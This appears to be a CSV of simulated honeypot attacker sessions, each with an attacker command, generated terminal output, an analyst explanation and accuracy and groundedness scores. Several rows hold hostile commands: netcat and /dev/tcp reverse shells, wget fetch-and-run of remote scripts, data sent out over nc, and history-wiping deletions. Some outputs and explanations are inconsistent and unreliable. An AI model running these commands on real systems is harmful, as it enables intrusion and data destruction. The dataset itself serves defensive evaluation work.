Architecture,Session_ID,Tactic,Turn,Command,Terminal_Output,Analyst_Explanation,Accuracy,Groundedness
baseline,BAS-001-970B52,Reconnaissance,8,`ls -al /home/user1`,"total 4
-rw-r--r-- 1 user1 user1 0 Apr 15 12:34 .bash_logout
-rw-r--r-- 1 user1 user1 0 Apr 15 12:34 .bash_profile
-rw-r--r-- 1 user1 user1 0 Apr 15 12:34 .bashrc",The attacker is attempting to enumerate files and directories within the target's home directory.,4,5
baseline,BAS-008-7B8B87,Credential Access,23,"`sudo /usr/bin/ssh-keygen -t rsa -N """" -f ~/.ssh/id_rsa`","Generating public/private rsa key pair.
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:abcdef1234567890abcdef1234567890abcdef root@localhost
The key's randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
|                 |
+----[SHA256]-----+",Attacker likely attempting to generate a SSH key pair for potential remote access.,5,5
baseline,BAS-012-4C0BDD,Command and Control,11,"`bash -c ""nc 10.0.0.1 443 < /etc/hosts""`",,The attacker is attempting to enumerate hosts and potentially establish a connection to a target server.,3,2
baseline,BAS-007-0BCE4E,Defense Evasion,14,`whoami`,www-data,The attacker is attempting to determine their own username.,5,5
baseline,BAS-023-5FA503,Discovery,8,"`bash -c ""whoami > /tmp/user.txt""`",,The attacker is attempting to identify their own username by running a command that outputs it to a file.,4,5
baseline,BAS-023-5FA503,Discovery,15,`rm -rf /tmp/loplibin.txt`,,"The attacker is attempting to delete a file in the `/tmp` directory, likely for data exfiltration or system disruption.",2,3
baseline,BAS-005-E19854,Persistence,9,`sudo chmod 7777 /bin/bash && cp /bin/bash /root/backdoor.sh`,"chmod: cannot access '/bin/bash': Permission denied
/bin/sh: cp: cannot stat '/bin/bash': No such file or directory",The attacker is attempting to gain root privileges and execute a backdoor script.,3,3
baseline,BAS-026-CDBBFA,Command and Control,14,"`echo '<script>bash -i &>/dev/tcp/10.0.0.1/8080 0>&1'</script>"" > /var/spool/mail/root`",-bash: /var/spool/mail/root: Permission denied,The attacker attempted to execute a malicious script that would allow them to gain root access and potentially execute further commands.,3,4
baseline,BAS-010-AAF00D,Lateral Movement,21,`ls /dev/null >> /etc/hosts`,,"The attacker is attempting to modify the `/etc/hosts` file, which could be used for DNS manipulation or service redirection.",4,4
baseline,BAS-010-AAF00D,Lateral Movement,17,`/usr/bin/find / -type f -exec cat {} \; | grep -o 'privileged' | xargs /bin/bash >> /tmp/output.txt`,,The attacker is attempting to enumerate privileged files and potentially gain access to sensitive information.,3,2
baseline,BAS-006-FE65D1,Privilege Escalation,6,rm -rf /root/.bash_history /root/.bashrc /root/.bash_profile,,"The attacker is attempting to delete critical system configuration files, likely aiming to disrupt or compromise the honeypot environment.",4,5
baseline,BAS-015-0323C1,Reconnaissance,19,lsb_release -a,"No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.1 LTS
Release:        22.04
Codename:       jammy","Attacker is attempting to gather system information, specifically the distribution and release details.",5,5
baseline,BAS-027-31695B,Exfiltration,9,"`/bin/bash -c ""curl http://example.com/exfiltration_tool.tgz > /tmp/tool.tar.gz""`","--2023-04-15 12:34:56--  http://example.com/exfiltration_tool.tgz
Resolving example.com (example.com)... 93.184.216.34, 2606:2800:220:1:248:1893:25c8:1946
Connecting to example.com (example.com)|93.184.216.34|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [application/x-gzip]
Saving to: '/tmp/tool.tar.gz'

     0           0 --.-K/s   in 0s      

2023-04-15 12:34:56 (inf/bps) - Download complete","The attacker is attempting to download a tar.gz file from a remote server, likely for exfiltration of data.",4,4
baseline,BAS-002-59DDBE,Resource Development,19,"`/bin/bash -c 'sudo rm -rf /tmp/lolbin.txt && sudo echo ""LOLBIN TEST"" > /root/loolbin.txt'`","/bin/bash: cannot remove '/tmp/lolbin.txt': Permission denied
/bin/bash: cannot touch '/root/loolbin.txt': Permission denied","Attacker attempted to delete a file and overwrite another, likely attempting to gain access to critical system files.",4,3
baseline,BAS-011-AD4945,Collection,12,`which netstat`,/usr/bin/netstat,The attacker is attempting to identify network tools and services on the honeypot.,4,5
baseline,BAS-007-0BCE4E,Defense Evasion,19,`cat /dev/null > /root/.bashrc`,,"The attacker is attempting to modify a critical system file, potentially to gain root access or execute malicious commands.",4,2
baseline,BAS-002-59DDBE,Resource Development,2,`/bin/bash -c 'ls -l /proc/*/fd | grep tmpfs'`,"/proc/1234/fd -> /dev/null
/proc/5678/fd -> /tmpfs",The attacker is attempting to enumerate system files and identify potential targets for further exploitation.,2,2
baseline,BAS-027-31695B,Exfiltration,25,"`/bin/bash -c ""rm -rf /tmp/exfil.log""`",,"The attacker is attempting to delete a log file, likely for exfiltration of data.",3,3
baseline,BAS-003-F0F47B,Initial Access,25,`ls -la ~`,"-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.bash_logout
-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.bashrc
-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.profile
-rw-r--r-- 1 dummyuser dummyuser 0 Jan  1 00:00 /home/dummyuser/.ssh/authorized_keys",The attacker is attempting to enumerate files and directories within the honeypot user's home directory.,4,4
baseline,BAS-007-0BCE4E,Defense Evasion,16,`nc 10.0.2.15 1234 -e /bin/sh`,nc: connect to 10.0.2.15 port 1234 (tcp) failed: Connection refused,The attacker is attempting to gain unauthorized access to a remote system by exploiting a network connection vulnerability.,3,4
baseline,BAS-028-69C891,Impact,2,`rm -rf /tmp/*`,,"The attacker is attempting to delete all files in the `/tmp` directory, which could be used for data exfiltration or denial-of-service attacks.",3,4
baseline,BAS-005-E19854,Persistence,22,`sudo cp -p /bin/sh /usr/local/bin/backdoor`,,"The attacker is attempting to copy a shell script (likely containing malicious code) to a location on the honeypot system, potentially for later execution.",3,2
baseline,BAS-023-5FA503,Discovery,13,"`/bin/bash -c ""ls""`",Desktop  Documents  Downloads  Music  Pictures,The attacker is attempting to list files in the honeypot's directory structure.,5,5
baseline,BAS-019-57585B,Persistence,16,`sudo wget http://example.com/lolbin.sh -O /tmp/lolbin.sh && chmod +x /tmp/lolbin.sh && sudo ./tmp/lolbin.sh`,"wget: unable to resolve host address 'example.com'
chmod: cannot access '/tmp/lolbin.sh': No such file or directory
cannot execute './tmp/lolbin.sh': No such file or directory",The attacker is attempting to download and execute a shell script from a known malicious source (example.com). This is likely part of a reconnaissance phase to identify potential targets.,2,2
baseline,BAS-011-AD4945,Collection,4,"`echo ""Hello World"" > /tmp/helloworld.txt`",,"The attacker is attempting to create a file named 'helloworld.txt' in the `/tmp` directory, which could be used for further actions like data exfiltration or persistence.",4,4
baseline,BAS-027-31695B,Exfiltration,21,`wget http://example.com/lolbin.sh && chmod +x lolbin.sh && ./lolbin.sh > /dev/null 2>&1`,,Attacker is attempting to download and execute a shell script likely designed for lateral movement or privilege escalation.,4,5
baseline,BAS-001-970B52,Reconnaissance,15,`sudo ls -l /home/user2/.ssh/id_rsa`,-rw------- 1 user2 user2 1766 Apr 15 12:34 /home/user2/.ssh/id_rsa,The attacker is attempting to enumerate authorized SSH keys on a honeypot system.,3,3
baseline,BAS-004-912D84,Execution,9,"`bash -c ""echo 'setuid' > /tmp/sudoers""`",,The attacker is attempting to gain root privileges by modifying the sudoers file.,3,4
baseline,BAS-001-970B52,Reconnaissance,22,`ls -lR /`,"/:

drwxr-xr-x 2 root root 4096 Apr 15 12:34 bin
-rw-r--r-- 1 root root 0 Apr 15 12:34 boot
...",Attacker is attempting to list directory contents and file permissions.,5,5
